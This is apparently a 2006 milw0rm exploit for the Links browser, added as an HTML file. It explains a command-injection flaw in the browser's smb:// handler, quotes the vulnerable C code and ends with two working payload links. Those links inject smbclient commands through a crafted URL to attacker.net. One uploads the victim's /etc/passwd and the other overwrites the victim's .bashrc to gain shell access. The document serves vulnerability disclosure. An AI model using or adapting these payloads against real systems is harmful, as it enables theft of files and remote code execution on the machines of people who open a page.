@@ -1,0 +1,54 @@
+<!--
+Links smbclient command execution
+-----------------------------------------------------------------------------
+There is a flaw in the Links web browser, that allows malicious web sites to
+execute smbclient commands on the victim's machine. This flaw makes it
+possible to read any file from the victim system (any file that the user
+running links has read access), or to upload any file to the victim system
+(any file that the user running links can create/overwrite).  The attacker
+could, for example, upload ~/.bashrc to gain shell access.
+
+Version numbers:
+-----------------------------------------------------------------------------
+I tested this on Ubuntu 6.06 LTS and Links 1.00pre12. Smbclient must also
+be installed.
+
+Vulnerable code:
+-----------------------------------------------------------------------------
+smb_func() in smb.c:
+   ...
+   143                 if (*share) {
+   144                         if (!*dir || dir[strlen(dir) - 1] == '/'
+|| dir[strlen(dir) - 1] == '\\') {
+   145                                 if (dir) {
+   146                                         v[n++] = "-D";
+   147                                         v[n++] = dir;
+   148                                 }
+   149                                 v[n++] = "-c";
+   150                                 v[n++] = "ls";
+   151                         } else {
+   152                                 unsigned char *ss;
+   153                                 unsigned char *s = stracpy("get
+\"");
+'dir' is the directory part of the smb://.. url:
+   154                                 add_to_strn(&s, dir);
+   155                                 add_to_strn(&s, "\" -");
+   156                                 while ((ss = strchr(s, '/')))
+*ss = '\\';
+   157                                 v[n++] = "-c";
+   158                                 v[n++] = s;
+   159                         }
+   160                 }
+   161                 v[n++] = NULL;
+smbclient is executed:
+   162                 execvp("smbclient", (char **)v);
+   163                 fprintf(stderr, "smbclient not found in $PATH");
+   164                 _exit(1);
+   ...
+-->
+<html>
+<a href='smb://attacker.net/work/XXX" YYY; lcd ..; lcd ..; lcd ..; lcd etc; put passwd ; exit; '>Put /etc/passwd</a>
+<a href='smb://attacker.net/work/XXX" YYY; lcd ..; lcd ..; lcd ..; lcd home; lcd teemu; get HOHO .bashrc; exit; '>Get .bashrc</a>
+</html>
+
+# milw0rm.com [2006-11-14]
